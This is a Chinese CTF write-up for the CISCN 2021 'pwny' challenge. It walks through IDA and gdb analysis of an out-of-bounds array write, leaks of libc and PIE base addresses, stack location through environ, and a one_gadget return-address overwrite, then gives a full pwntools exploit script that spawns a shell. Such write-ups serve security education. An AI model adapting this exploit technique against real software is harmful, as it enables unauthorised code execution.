# CISCN 2021 pwny

> CISCN 2021 初赛 第十四届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 pwn
>
> challenge name: pwny
>
> file: pwny, libc-2.27.so
>
> No description
>
> .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16
>
> refer writeup: https://www.cnblogs.com/hktk1643/p/14774444.html    and   waterdrop lwl

- Anti: PIE，ASLR

思路：覆盖fd为0，泄露主程序、libc基址，利用environ得到一个函数的返回地址，利用one_gadget将返回地址修改为`libc.address + 0x10a41c`从而执行` execve("/bin/sh", rsp+0x70, environ)`



## Warning

经测试，在kali 20.04下，大概率由于libc版本问题，使用`process("./pwny", env={'LD_PRELOAD': './libc-2.27.so'})`时会在`recvuntil("choice: ")`处`raise EOFError`。

在kali 18.04, python 3.6.6, pwntools 4.5.0, 可以使用Exploit下的脚本getshell

在Ubuntu 1804, python 3.6.9, pwntools 4.5.1, 可以使用Exploit下的脚本getshell。后续分析在Ubuntu 1804上完成

> 后记：也可能与pwntools版本有关，实测pwntools 4.6.0版本有多个bug，包含无法attach gdb 10.1.2

# checksec

```bash
$ file pwny
pwny: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a14a51d7799ec9c936f0c8096c737470a079001b, stripped
$ checksec --file=pwny
RELRO       STACK CANARY  NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY Fortified  Fortifiable FILE
Full RELRO  Canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  No Symbols    Yes   1          2           pwny
```

- Full RELRO  Canary found  NX enabled  PIE enabled



# IDA Analysis

- 拖入IDA 64bit中，分析main函数:
- 这里将read, write两个选项的处理函数进行了更名

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 vars0[5]; // [rsp+0h] [rbp+0h] BYREF
  vars0[1] = __readfsqword(0x28u);
  sub_A10(); // 将 .bss:202860 上的变量(更名为fd)赋值为"/dev/urandom"的句柄号 result = open("/dev/urandom", 0); fd = result;
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. read");
      puts("2. write");
      puts("3. exit");
      __printf_chk(1LL, "Your choice: ");
      __isoc99_scanf("%ld", vars0);
      if ( LODWORD(vars0[0]) != 2 )
        break;
      write_handler();                          // 2: write
    }
    if ( LODWORD(vars0[0]) == 3 )
      goto LABEL_6;
    if ( LODWORD(vars0[0]) != 1 )
      break;
    read_handler();                             // 1: read
  }
  puts("NO");
LABEL_6:
  exit(0);
}
```





## .bbs

- 在`sub_BA0()`即处理write操作的函数中双击存储用的数组或者fd可以跳转到存储这两个变量的bbs段，该段用于存储全局变量。同时可以看到stdout, stdin, stderr也在这里

```assembly
.bss:0000000000202020 _bss            segment align_32 public 'BSS' use64
.bss:0000000000202020                 assume cs:_bss
.bss:0000000000202020                 ;org 202020h
.bss:0000000000202020                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:0000000000202020                 public stdout
.bss:0000000000202020 ; FILE *stdout
.bss:0000000000202020 stdout          dq ?                    ; DATA XREF: LOAD:0000000000000418↑o
.bss:0000000000202020                                         ; sub_A10+19↑r
.bss:0000000000202020                                         ; Copy of shared data
.bss:0000000000202028                 align 10h
.bss:0000000000202030                 public stdin
.bss:0000000000202030 ; FILE *stdin
.bss:0000000000202030 stdin           dq ?                    ; DATA XREF: LOAD:0000000000000430↑o
.bss:0000000000202030                                         ; sub_A10+4↑r
.bss:0000000000202030                                         ; Copy of shared data
.bss:0000000000202038                 align 20h
.bss:0000000000202040                 public stderr
.bss:0000000000202040 ; FILE *stderr
.bss:0000000000202040 stderr          dq ?                    ; DATA XREF: LOAD:0000000000000448↑o
.bss:0000000000202040                                         ; sub_A10+2E↑r
.bss:0000000000202040                                         ; Copy of shared data
.bss:0000000000202048 byte_202048     db ?                    ; DATA XREF: sub_9C0↑r
.bss:0000000000202048                                         ; sub_9C0+28↑w
.bss:0000000000202049                 align 20h
.bss:0000000000202060 ; _QWORD arr[256]
.bss:0000000000202060 arr             dq 100h dup(?)          ; DATA XREF: read_handler+45↑o
.bss:0000000000202060                                         ; write_handler+5F↑o
.bss:0000000000202860 fd              db ?                    ; DATA XREF: sub_A10+57↑w
.bss:0000000000202860                                         ; sub_AD0+4↑r ...
.bss:0000000000202861                 align 8
.bss:0000000000202861 _bss            ends
```

- `QWORD==8 Bytes`, 256x8 = 2048 = 0x800 B. 故arr[256]的地址即为fd的地址。向arr[256]写入的内容将会写入到fd中
- -4x8 = -0x20 故arr[-4]的地址即为 stderr 的地址



## gdb Analysis and Let fd=0

- 探究fd在第一次`write(256)`后的值是什么，以及fd是怎么变成0的。使用gdb, pwndbg调试

太长不看版：

1. exp将`gdb.attach(sh)`放在一开始的两个`write(256)`的中间
2. 运行exp后，下断点`b __printf_chk`
3. c, 断在`write_handler`中的`__printf_chk`调用内部
4. finish, 从`__printf_chk`结束回到pwny的`write_handler`
5. 多次ni, 执行到`arr[idx] = v2`对应的汇编指令处，查看`arr[256]`前后的值，以及v2的值

详细过程：

- gdb.attach(sh) 放在第一次write(256)的后面，也就是程序开始运行后先执行一遍wirte(256)。
- 将断点下在 `__printf_chk`处。如果一开始下在read处，会导致在一些奇奇怪怪的地方断下，疑似某些库函数内的read。
- 由于main中的`__printf_chk(1LL, "Your choice: ");`在`__isoc99_scanf`前，而`gdb.attach(sh)`后会断在`scanf`处，所以不会断在main中的第一个 `__printf_chk`处，而是continue后断在`write_handler`的第一个`__printf_chk`

```assembly
pwndbg> b __printf_chk
Breakpoint 1 at 0x7fb5aad25060
pwndbg> c
Breakpoint 1, 0x00007fb5aad25060 in __printf_chk () from ./libc-2.27.so
──────────────────────────[ REGISTERS ]─────────────────────────────
*RAX  0x0
*RBX  0x7fff5d99a8e0 ◂— 0x5fa5b313c94cba82
*RCX  0x10
*RDX  0x7fb5aafe08d0 ◂— 0x0
*RDI  0x1
*RSI  0x563bacfbdd05 ◂— outsb  dx, byte ptr [rsi] /* 'Index: ' */
*R8   0x0
*R9   0x0
*R10  0x7fb5aad91c40 ◂— add    al, byte ptr [rax]
*R11  0x563bacfbdd04 ◂— add    byte ptr [rcx + 0x6e], cl
*R12  0x563bacfbd900 ◂— xor    ebp, ebp
*R13  0x7fff5d99aa10 ◂— 0x1
*R14  0x0
*R15  0x0
*RBP  0x7fff5d99a910 ◂— 0x2
*RSP  0x7fff5d99a8d8 —▸ 0x563bacfbdbca ◂— lea    rdi, [rip + 0x130]
*RIP  0x7fb5aad25060 (__printf_chk) ◂— push   r12
──────────────────────────────[ DISASM ]──────────────────────────────
 ► 0x7fb5aad25060 <__printf_chk>       push   r12
   0x7fb5aad25062 <__printf_chk+2>     push   rbp
   0x7fb5aad25063 <__printf_chk+3>     mov    r12d, edi
   0x7fb5aad25066 <__printf_chk+6>     push   rbx
   0x7fb5aad25067 <__printf_chk+7>     mov    r10, rsi
   0x7fb5aad2506a <__printf_chk+10>    sub    rsp, 0xd0
   0x7fb5aad25071 <__printf_chk+17>    test   al, al
   0x7fb5aad25073 <__printf_chk+19>    mov    qword ptr [rsp + 0x30], rdx
   0x7fb5aad25078 <__printf_chk+24>    mov    qword ptr [rsp + 0x38], rcx
   0x7fb5aad2507d <__printf_chk+29>    mov    qword ptr [rsp + 0x40], r8
   0x7fb5aad25082 <__printf_chk+34>    mov    qword ptr [rsp + 0x48], r9
──────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp 0x7fff5d99a8d8 —▸ 0x563bacfbdbca ◂— lea    rdi, [rip + 0x130]
01:0008│ rbx 0x7fff5d99a8e0 ◂— 0x5fa5b313c94cba82
02:0010│     0x7fff5d99a8e8 ◂— 0xa87759b016f9f100
03:0018│     0x7fff5d99a8f0 —▸ 0x563bacfbdd1a ◂— xor    dword ptr [rsi], ebp /* '1. read' */
04:0020│     0x7fff5d99a8f8 —▸ 0x563bacfbdd1a ◂— xor    dword ptr [rsi], ebp /* '1. read' */
05:0028│     0x7fff5d99a900 —▸ 0x7fff5d99a910 ◂— 0x2
06:0030│     0x7fff5d99a908 —▸ 0x563bacfbd8e6 ◂— jmp    0x563bacfbd875
07:0038│ rbp 0x7fff5d99a910 ◂— 0x2
─────────────────────────────────[ BACKTRACE ]───────────────────────
 ► f 0   0x7fb5aad25060 __printf_chk
   f 1   0x563bacfbdbca   ; 注意这个地址，是main中write_handler内的call __printf_chk的下一个地址
   f 2   0x563bacfbd8e6
   f 3   0x7fb5aac14bf7 __libc_start_main+231
```

- finish: 执行完余下指令直至当前函数结束。结束当前的`__printf_chk`调用后返回到了`0x0000563bacfbdbca`。
- 注意程序开启了PIE，地址仅后12bit与IDA中显示的相同

```assembly
pwndbg> finish ; 执行完__printf_chk，回到pwny程序中
Run till exit from #0  0x00007fb5aad25060 in __printf_chk () from ./libc-2.27.so
0x0000563bacfbdbca in ?? ()
```

- IDA中write handler中第一个`__printf_chk`调用的下一个地址就是`BCA`结尾

```assembly
.text:0000000000000BC5                 call    ___printf_chk
.text:0000000000000BCA                 lea     rdi, aLd        ; "%ld"     注意这里的BCA
```

- write handler的汇编代码：

```assembly
.text:0000000000000BA0 ; 2: write handler
.text:0000000000000BA0 write_handler  proc near            ; CODE XREF: main+91↑p
.text:0000000000000BA0
.text:0000000000000BA0 var_28       = qword ptr -28h
.text:0000000000000BA0 var_20       = qword ptr -20h
.text:0000000000000BA0 ; __unwind {
.text:0000000000000BA0              push    rbp
.text:0000000000000BA1              push    rbx
.text:0000000000000BA2              lea     rsi, aIndex     ; "Index: "
.text:0000000000000BA9              mov     edi, 1
.text:0000000000000BAE              sub     rsp, 18h        ; Integer Subtraction
.text:0000000000000BB2              mov     rax, fs:28h
.text:0000000000000BBB              mov     [rsp+28h+var_20], rax
.text:0000000000000BC0              xor     eax, eax        ; Logical Exclusive OR
.text:0000000000000BC2              mov     rbx, rsp
.text:0000000000000BC5              call    ___printf_chk   ; Call Procedure
.text:0000000000000BCA              lea     rdi, aLd        ; "%ld"   ; 前面调试时，finish后就是回到这里
.text:0000000000000BD1              mov     rsi, rbx
.text:0000000000000BD4              xor     eax, eax        ; Logical Exclusive OR
.text:0000000000000BD6              call    ___isoc99_scanf ; Call Procedure
.text:0000000000000BDB              movzx   edi, cs:fd      ; fd
.text:0000000000000BE2              mov     edx, 8          ; nbytes
.text:0000000000000BE7              mov     rsi, rbx        ; buf
.text:0000000000000BEA              mov     rbp, [rsp+28h+var_28] ; idx = v2;
.text:0000000000000BEE              mov     [rsp+28h+var_28], 0 ; v2 = 0LL;
.text:0000000000000BF6              call    _read           ; 重点分析这个read导致的fd的变化。rbx存储的是v2的地址，用作buf !!
.text:0000000000000BFB              mov     rdx, [rsp+28h+var_28]
.text:0000000000000BFF              lea     rax, arr        ; Load Effective Address
.text:0000000000000C06              mov     [rax+rbp*8], rdx ; arr[idx] = v2; [rax+rbp*8] 就是 arr[idx]
.text:0000000000000C0A              mov     rax, [rsp+28h+var_20] ; 这里开始就是canary的操作了
.text:0000000000000C0F              xor     rax, fs:28h     ; Logical Exclusive OR
.text:0000000000000C18              jnz     short loc_C21   ; Jump if Not Zero (ZF=0)
.text:0000000000000C1A              add     rsp, 18h        ; Add
.text:0000000000000C1E              pop     rbx
.text:0000000000000C1F              pop     rbp
.text:0000000000000C20              retn                    ; Return Near from Procedure
.text:0000000000000C21 ; ---------------------------------------------------------------------------
.text:0000000000000C21
.text:0000000000000C21 loc_C21:                             ; CODE XREF: write_handler+78↑j
.text:0000000000000C21              call    ___stack_chk_fail ; Call Procedure
.text:0000000000000C21 ; } // starts at BA0
.text:0000000000000C21 write_handler   endp
```

- 分析上方的汇编指令可知，如果`C06`处的`mov  [rax+rbp*8], rdx; arr[idx] = v2` 执行完之后，就可以在gdb调试中知道`arr[256](i.e. fd), v2`的值分别为什么了

```assembly
pwndbg> ni     ; 0x0000563bacfbdbf6 in ?? ()
 RAX  0x1
 RBX  0x7fff5d99a8e0 ◂— 0x0
 RCX  0x10
 RDX  0x8
 RDI  0x82
 RSI  0x7fff5d99a8e0 ◂— 0x0
 R8   0x0
 R9   0x0
 R10  0x7fb5aad91c40 ◂— add    al, byte ptr [rax]
 R11  0x563bacfbdd04 ◂— add    byte ptr [rcx + 0x6e], cl
 R12  0x563bacfbd900 ◂— xor    ebp, ebp
 R13  0x7fff5d99aa10 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x100
 RSP  0x7fff5d99a8e0 ◂— 0x0
*RIP  0x563bacfbdbf6 ◂— call   0x563bacfbd7e0
───────────────────────────[ DISASM ]───────────────────────────────────
   0x563bacfbdbdb    movzx  edi, byte ptr [rip + 0x201c7e]
   0x563bacfbdbe2    mov    edx, 8
   0x563bacfbdbe7    mov    rsi, rbx
   0x563bacfbdbea    mov    rbp, qword ptr [rsp]
   0x563bacfbdbee    mov    qword ptr [rsp], 0
 ► 0x563bacfbdbf6    call   read@plt <read@plt>
        fd: 0x82 ; 此时fd的值还没有变为0，注意在第一次write(256)后，fd的值为随机数
        buf: 0x7fff5d99a8e0 ◂— 0x0
        nbytes: 0x8
 
   0x563bacfbdbfb    mov    rdx, qword ptr [rsp]
   0x563bacfbdbff    lea    rax, [rip + 0x20145a]
   0x563bacfbdc06    mov    qword ptr [rax + rbp*8], rdx    ; arr[idx] = v2
```

- 执行到`bf6`处可以看到v2的地址，以及fd的值

```assembly
pwndbg> ni
0x0000563bacfbdc06 in ?? ()
─────────────────────────────[ REGISTERS ]────────────────────────────────────────
*RAX  0x563bad1bf060 ◂— 0x0
 RBX  0x7fff5d99a8e0 ◂— 0x0
 RCX  0x7fb5aad03151 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x82
 RSI  0x7fff5d99a8e0 ◂— 0x0
 R8   0x0
 R9   0x0
 R10  0x7fb5aad91c40 ◂— add    al, byte ptr [rax]
 R11  0x246
 R12  0x563bacfbd900 ◂— xor    ebp, ebp
 R13  0x7fff5d99aa10 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x100
 RSP  0x7fff5d99a8e0 ◂— 0x0
*RIP  0x563bacfbdc06 ◂— mov    qword ptr [rax + rbp*8], rdx
────────────────────────────────[ DISASM ]───────────────────────────────────
   0x563bacfbdbea    mov    rbp, qword ptr [rsp]
   0x563bacfbdbee    mov    qword ptr [rsp], 0
   0x563bacfbdbf6    call   read@plt <read@plt>
 
   0x563bacfbdbfb    mov    rdx, qword ptr [rsp]
   0x563bacfbdbff    lea    rax, [rip + 0x20145a]
 ► 0x563bacfbdc06    mov    qword ptr [rax + rbp*8], rdx  ; arr[idx] = v2
   0x563bacfbdc0a    mov    rax, qword ptr [rsp + 8]
   0x563bacfbdc0f    xor    rax, qword ptr fs:[0x28]
───────────────────────────────[ STACK ]──────────────────────────────────
00:0000│ rbx rsi rsp 0x7fff5d99a8e0 ◂— 0x0
01:0008│             0x7fff5d99a8e8 ◂— 0xa87759b016f9f100
02:0010│             0x7fff5d99a8f0 —▸ 0x563bacfbdd1a ◂— xor    dword ptr [rsi], ebp /* '1. read' */
03:0018│             0x7fff5d99a8f8 —▸ 0x563bacfbdd1a ◂— xor    dword ptr [rsi], ebp /* '1. read' */
04:0020│             0x7fff5d99a900 —▸ 0x7fff5d99a910 ◂— 0x2
────────────────────────────────[ BACKTRACE ]───────────────────────────
 ► f 0   0x563bacfbdc06
   f 1   0x563bacfbd8e6
   f 2   0x7fb5aac14bf7 __libc_start_main+231
pwndbg> ni ; 到了c06这一行之后再执行一行
pwndbg> print $rdx
$1 = 0
pwndbg> p /x *(int*)($rax+0x100*8)
$3 = 0x0
```

- 到了c06后再执行一行，再去查看fd的值以及v2的值，发现两者都为0了



## why fd=3 in 1st write(256)

- 将exploit的`gdb.attach(sh)`放在第一个`write(256)`之前，然后使用如下gdb指令：
  - 1. `b __printf_chk`: 在`printf_chk`函数上下断点
    2. `c`: 直至断点断下，此时断在write handler中输出 "Index: " 的地方，但在`./libc-2.27.so`库中
    3. `finish`: 执行完`./libc-2.27.so`的`printf_chk`，回到write handler中
    4. `ni`...直至`xxxbf6`的 `call   read@plt <read@plt>`
- 可以看到第一次调用`write(256)`时，`read@plt`被调用时，fd的值为3.

```assembly
   0x55d400d9ebe7    mov    rsi, rbx
   0x55d400d9ebea    mov    rbp, qword ptr [rsp]
   0x55d400d9ebee    mov    qword ptr [rsp], 0
 ► 0x55d400d9ebf6    call   read@plt <read@plt>
        fd: 0x3
        buf: 0x7ffe7b3c2c90 ◂— 0x0
        nbytes: 0x8
```

- 文件描述符fd是整数，标明每一个被进程打开的文件和socket
- Linux平台上，对于Console标准输入（0），标准输出（1），标准错误输出（2）对应了三个文件描述符
- 所以该程序打开的`"/dev/urandom"`的fd为3

> 查看最大文件描述符限制: `sudo sysctl -a | grep -i file-max --color`
>
> ubuntu1804上输出为 fs.file-max = 394686  这个数不是2的幂，受用户级、系统级限制

# Pwn Chain

攻击链：

1. 覆盖fd：两次write(256)，覆盖fd=0(stdin)，使得read, write用stdin作为输入
2. 泄露libc基址：read(-4)读取stderr的真实地址，与`libc.sym['_IO_2_1_stderr_']`做差，得到libc的基址
3. 泄漏程序(pwny)基址：利用`.data:202008 off_202008  dq offset off_202008`上的偏移量的真实值减去pie前的`0x202008`得到pwny的pie基址。这一步其实有很多其他可用于计算pwny基址的地方。
4. 获取 environ 地址。由于知道了libc的基址了，用`libc.sym['environ']`得到地址，再利用`read_handler`得到实际地址
5. 通过 environ 实际地址计算出`write_handler`返回地址的值，即`ret`时的rsp的值，利用one_gadget，满足对应gadget的约束条件，覆盖返回地址为one_gadget的地址

## Leak libc Base Address

从IDA中分析stdin / stdout / stderr的地址，计算出相对于arr的偏移（负数），然后在程序运行时使用read读取出实际的值，再与`libc.sym['_IO_2_1_stderr_']`做差(以stderr为例)，得到libc的基址

## Leak PIE Address

通过read方法得到数据段上的偏移量在运行过程中的实际值，再与IDA中显示的PIE前的地址做差，得到程序的基址，即PIE基址的偏移地址。

## environ

```python
def calc(addr):  # 计算想要的地址相对于 addr of arr 的 index
    return int((addr - arr_addr) / 8)
environ = libc.sym['environ']
read(calc(environ))
environ = int(b"0x" + sh.recvline(keepends=False), 16)
```



## one_gadgets and Return Address

> https://blog.csdn.net/chennbnbnb/article/details/104035261 为什么可以利用 environ 
>
> 需要安装有one_gadget

可能可以利用的one_gadget: 

```bash
$ one_gadget libc-2.27.so 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

- 这里选用了`0x10a41c`的，注意需要满足条件 `[rsp+0x70] == NULL`，exp中会有对应操作使得满足该约束
- 需要注意，`write_handler`中的rbp除函数序言/尾声中会`push rbp; pop rbp`外，中间有语句修改了rbp的值
- 脚本输出(e.g.)

```assembly
calc(environ)= 0x52d34962a07  libc.sym['environ'] = 0x7f3c4685d098
addr of environ = 0x7fff01a4c798 ; 这个值和stack的值的差值不会变，可以利用这个值得到stack的值，也就是ret前的rsp的值，即Return Address
stack = 0x7fff01a4c678 stack+0x70 = 0x7fff01a4c6e8
```

- 而在`write(calc(stack + 0x70), p64(0), True)`时的write_handler 的 ret处断下时，rsp = stack = 0x7fff01a4c678，从下列输出可以看到`0x7fff01a4c678 —▸ 0x55d2a1b468e6`，也就是rsp指向的内存地址0x7fff01a4c678所存储的值是main函数中的地址（下一个要执行的指令地址0x55d2a1b468e6），从 BACKTRACE 中也能看到这确实是下一个要执行的地址
- 知识点：下一个要执行的指令是`ret`, 而`ret`相当于 `pop EIP`，故rsp存储的指针0x7fff01a4c678上存储的0x55d2a1b468e6就是Return Address

```assembly
pwndbg> ni    ; 0x000055d2a1b46c20 in ?? ()
*RBP  0x7fff01a4c680 ◂— 0x2
*RSP  0x7fff01a4c678 —▸ 0x55d2a1b468e6 ◂— jmp    0x55d2a1b46875
*RIP  0x55d2a1b46c20 ◂— ret    
───────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
   0x55d2a1b46c1a    add    rsp, 0x18
   0x55d2a1b46c1e    pop    rbx
   0x55d2a1b46c1f    pop    rbp
 ► 0x55d2a1b46c20    ret    <0x55d2a1b468e6>   ; 下一条要执行的指令是ret ; 这里也提示了，这条ret指令会回到什么地方
    ↓
   0x55d2a1b468e6    jmp    0x55d2a1b46875 <0x55d2a1b46875>
    ↓
   0x55d2a1b46875    mov    rdi, rbx
   0x55d2a1b46878    call   puts@plt <puts@plt>
───────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp 0x7fff01a4c678 —▸ 0x55d2a1b468e6 ◂— jmp    0x55d2a1b46875 ; 下一条要执行的指令是ret
01:0008│ rbp 0x7fff01a4c680 ◂— 0x2                          ; 故会pop EIP将RSP指向的内存地址上的值0x55d2a1b468e6赋值给EIP
02:0010│     0x7fff01a4c688 ◂— 0xd2dac1c77d883000
03:0018│     0x7fff01a4c690 —▸ 0x7fff01a4c780 ◂— 0x1
04:0020│     0x7fff01a4c698 ◂— 0x0
05:0028│     0x7fff01a4c6a0 —▸ 0x55d2a1b46c70 ◂— push   r15
06:0030│     0x7fff01a4c6a8 —▸ 0x7f3c46490bf7 (__libc_start_main+231) ◂— mov    edi, eax
07:0038│     0x7fff01a4c6b0 ◂— 0x2000000000
─────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0   0x55d2a1b46c20
   f 1   0x55d2a1b468e6 ; 从调用栈这里也能看到caller的下一个地址就是0x55d2a1b468e6
   f 2   0x7f3c46490bf7 __libc_start_main+231
```



# Exploit

> TEST PASS:
>
> 1. kali 18.04, Python 3.6.6, pwntools 4.5.0, libc-2.27.so, ld-2.27.so.
> 2. Ubuntu 1804, python 3.6.9, pwntools 4.5.1, libc-2.27.so, ld-2.27.so
>
> 在`gdb.attach()`时，会有`[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)`，实际上gdb有运行，同时在MobaXterm无法显示gdb窗口，在虚拟机上有gdb窗口。所以建议在运行时在linux虚拟机上直接运行，而不是远程连接linux虚拟机运行。
>
> cannot run(by default): kali 1904, kali 2004

```python
from pwn import *
context.binary = './pwny'
sh = process("./pwny", env={'LD_PRELOAD': './libc-2.27.so'})
# sh = process(["./ld-2.27.so", "./pwny"], env={'LD_PRELOAD': './libc-2.27.so'})
# sh = remote("124.71.229.55", "22991")


def read(idx):
    sh.sendlineafter("Your choice: ", "1")
    sh.sendlineafter(b"Index: ", p64(idx & 0xffffffffffffffff))  # 16个f


def write(idx, buf='', is_stdin=False):  # id=1
    # sh.sendlineafter("Your choice: ", "2")
    sh.recvuntil("choice: ")
    sh.sendline("2")
    # __printf_chk(1LL, "Index: "); __isoc99_scanf("%ld", &v2);
    sh.sendlineafter("Index: ", str(idx))
    if(is_stdin == True):
        sh.send(buf)  # read((unsigned __int8)fd, &v2, 8uLL);


# ===== STEP-1 覆盖fd为 0(stdin)
write(256)  # qword_202060 idx=256刚好就是fd的存储位置，都在.bbs段
# 第一次 write(256) 会将fd覆盖为一个随机数
# gdb.attach(sh)
write(256)  # 第二次 write(256) 时，由于fd被覆盖为一个随机数(并且大概率不是0,1,2,3)
# 这就导致了这个fd实际上是未打开，没有对应文件/socket的。导致buf被置为0，然后 arr[256](i.e. fd) = 0

# ===== STEP-2 计算libc基址
read(-4)  # arr[-4] 即为 stderr 的值(from IDA analysis) # stdin stdout 也在附近，也可以用
sh.recvuntil("Result: ")
# 接收程序返回的stderr的地址，按16进制解析（因为程序中输出的方式为 %lx）
stderr = int(b"0x" + sh.recvline(keepends=False), 16)  # recv actual addr of stderr
libc = ELF("./libc-2.27.so")  # 获取ELF文件的信息
print("addr of stderr =", hex(stderr))
libc.address = stderr - libc.sym['_IO_2_1_stderr_']  # libc基地址 # sym: Alias for ELF.symbols
print("addr of libc-2.27.so =", hex(libc.address))

# ===== STEP-3 计算pwny pie基址，得到arr真实地址 # 这一步用 0x201d80 上的也行，应该还有很多能用的
# .bss:202060 arr dq 100h dup(?) # 0x202060即为分析中所说的 size=0x100 的矩阵 arr
# .data:202008 off_202008  dq offset off_202008
read(-0xb)  # 0x202060(addr of arr) - 0x58(0xb x 8) = 0x202008
sh.recvuntil("Result: ")
pie = int(b"0x" + sh.recvline(keepends=False), 16) - 0x202008
arr_addr = pie + 0x202060
print("PIE address =", hex(pie), "addr of arr =", hex(arr_addr))


def calc(addr):  # 计算想要的地址相对于 addr of arr 的 index
    return int((addr - arr_addr) / 8)


# ===== STEP-4 获得 environ 地址
# .text:8B4  call ___isoc99_scanf ; main __printf_chk(1LL, "Your choice: ");后的输入
# 0xC06 write_handler 中 arr[idx] = v2; 对应的汇编语句
gdb.attach(sh, "b *$rebase(0x8b4)\nb *$rebase(0xC06)\nc")  # 这个attach可以用于分析返回地址与environ的差值
environ = libc.sym['environ']
# 在libc中保存了一个函数叫_environ，存的是当前进程的环境变量,通过_environ的地址得到_environ的值，从而得到环境变量地址
# 环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量
read(calc(environ))
print("calc(environ)=", hex(calc(environ)), " libc.sym['environ'] =", hex(libc.sym['environ']))
sh.recvuntil("Result: ")
# 原exp这里最后要 - 0xa00 后面计算environ的时候再加回来，具体原因未知。其实是因为我还不懂environ具体是什么
environ = int(b"0x" + sh.recvline(keepends=False), 16)

print("addr of environ =", hex(environ))

# write(calc(environ), p64(0xdeadbeef), True)  # 实际上这里的操作没有作用 # 仅便于调试?

stack = environ - 0x120  # write handler 的返回地址 # 原exp这里是 + 0x8e0
print("stack =", hex(stack), "stack+0x70 =", hex(stack + 0x70))
# constraints: [rsp+0x70] == NULL # 0x10a41c one_gadgets 的约束条件
write(calc(stack + 0x70), p64(0), True)  # 为满足0x10a41c 的 one_gadgets 的约束条件
# one_gadget 0x10a41c execve("/bin/sh", rsp+0x70, environ)
write(calc(stack), p64(libc.address + 0x10a41c), True)  # 向RA写入 one_gadgets 地址


sh.interactive()

```



